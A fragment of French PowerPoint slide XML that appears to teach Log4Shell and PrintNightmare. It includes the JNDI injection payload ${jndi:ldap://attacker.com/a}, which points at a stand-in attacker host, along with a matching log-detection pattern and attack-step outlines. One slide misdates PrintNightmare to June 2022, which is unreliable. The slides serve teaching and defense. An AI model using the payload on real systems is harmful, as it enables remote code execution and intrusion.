              <a:t>l’application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3188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23F2E-447D-DACD-932C-8F59E7E9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Pourquoi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>est-ce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faille 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DB363-72D7-A8B6-1D76-AC4AE92AE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Mauvaise</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> validation des entrées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Log4j </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>exécute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>chaînes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> sans </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contrôle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Exploitation via JNDI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Permet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>chargement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de classes Java </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>arbitraires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Exécution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> de code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Les classes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillantes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>chargées</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>peuvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>exécuter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>commandes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>système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9313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1A84-337E-C0D4-B393-39EE9F56B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Log4shell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>d’une</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> charge utile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8B625-465C-0D7A-084B-1CC5247BE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Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de payload :</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>${</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>jndi:ldap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>/a}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/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Étape 1 :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>L’application</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>consigne</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>cette</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>chaîne</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via Log4j.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Étape 2 :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> Log4j </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>reconnaît</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> le format ${} et active JNDI.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3293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E3DFB-368A-8894-9CF6-79C1314FE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Comportement JNDI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35C1CE-DF28-507C-EB99-B6DE5B31DE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6607158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6912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A3A8-788D-BCA2-F11A-A73C77831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Impact technique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D9CFE-9E01-644B-9FC4-119722A9C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Exécution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>commandes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> à distance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L’objet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> Java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contenir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> un code qui </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>exécute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>commandes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Runtime.exec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Exfiltration de données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Les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>chaînes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> LDAP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>peuvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>transmettre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des données </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sensibles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Propagation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combiné</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> avec </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’autres</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> exploits pour un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mouvement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>latéral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2062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0342-824C-744C-8537-850BDF9FE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Détection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>l’exploitation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EC1FB-EB34-5163-104A-AC6B0EDF5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Analyse des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>journaux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Rechercher</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>modèles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${</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>jndi:ldap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>://}.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Surveillance réseau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Identifier des connexions LDAP/RMI </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>suspectes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Outils</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>spécifiques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Utilisation de scanners (ex. : Burp Suite, Nessus).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9497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E756-F22E-6DD8-1D49-C1B7496BE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Attaques</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>réelles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>signalées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37314-3C1B-B844-05B8-C1471C0A7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Ransomware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Exploitation de Log4Shell pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>chiffrer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les données.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Botnets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Recrutement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de machines dans des réseaux </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillants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Espionnage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Utilisation pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>voler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>informations</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sensibles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2828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76814D-F073-D756-B529-FF861E282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Les dernières techniques d’attaques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EE1101-520A-CE49-4AB1-EE831C5035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463426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4083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BA870-B84B-67E5-6F4E-ACC8178C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1"/>
            <a:ext cx="9144000" cy="869092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GB" sz="2400" err="1"/>
              <a:t>PrintNightmare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400"/>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" err="1"/>
              <a:t>Pourquoi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" err="1"/>
              <a:t>cela</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400"/>
              <a:t> a-t-il </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" err="1"/>
              <a:t>duré</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" err="1"/>
              <a:t>si</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" err="1"/>
              <a:t>longtemps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400"/>
              <a:t> ?</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="24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07E145-FE2E-280A-84DC-39B420B162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375297"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1430338" y="2286000"/>
          <a:ext cx="9237662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8517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DFA743-E767-1B56-56E6-94391B596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 sz="2600">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Qu’est-ce que PrintNightmare ?</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="26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753124-2F6F-EF77-313D-840A888D99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6914735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8857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527F-E488-F7B0-2775-CD1F79ADC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Origine et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>découverte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9D8E2-7A65-CE4C-F54F-4CA428FB1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Date de publication :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> Juin 2022.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Origine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Vulnérabilité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>initialement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>identifiée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un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>problème</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d'élévation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>privilèges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Des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>chercheurs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ont</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> ensuite </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>démontré</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>qu’elle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pouvait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exploitée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour 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Service </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>vulnérable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Windows Print Spooler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>utilisé</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>gérer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les travaux </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d'impression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> et les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pilotes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2522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4754-6A67-9E79-0C29-4A8FFCAE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Contexte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> technique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E16F4-5B65-F952-5A86-F2E25DB0D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Print Spooler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Service Windows chargé de la gestion des impressions.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Permet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l'installation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> et le partage de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pilotes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d'impression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> sur un réseau.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Fonctionnalités</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>clés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Possibilité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d'ajouter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pilotes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>distants</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via RPC.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Prise </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> charge de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l'installation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>automatique</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pilotes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Problème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Un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>utilisateur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> non </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>privilégié</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>peut</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> forcer le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>système</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> à charger un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pilote</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillant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0740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8C9D5-30EF-74E0-E20C-F115E5B17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Principe de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>PrintNightmare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A7B4A-2ED4-C768-13AD-E1DC614AE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 err="1"/>
              <a:t>Chargement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>pilotes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Le Print Spooler </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>permet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’installation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pilotes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d'impression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> sans </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vérification</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>adéquate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Exploitabilité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Un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>attaquant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>peut</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> forcer le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>chargement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> d'un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pilote</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>signé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non.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Conséquences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Exécution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>arbitraire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> sur la machine </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>cible</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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Élévation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>privilèges</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>jusqu’à</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> SYSTEM.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9536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4D30D-A62D-6E33-8C51-9E9789A4B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Étapes de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’attaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>RCEÉtapes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’attaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> RCE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0085-9912-368C-CEAC-0091161B9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/>
              <a:t>Connexion </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>distante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L'attaquant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>cible</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>serveur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> Print Spooler </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vulnérable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via RPC.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Soumission</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> d’un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>pilote</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>malveillant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Fournit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fichier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> .DLL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>déguisé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pilote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Chargement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>exécution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Le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>système</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> charge la DLL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillante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mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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L’attaquant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>obtient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>accès</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> à distance avec des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>privilèges</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>élevés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1035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2F0E-9A41-BA39-CC52-6217E33C2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Étapes de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>l’attaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> LPE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532A7-16D5-8EA1-CCCF-F72E660C6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 err="1"/>
              <a:t>Contexte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> local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L'attaquant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> a déjà un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
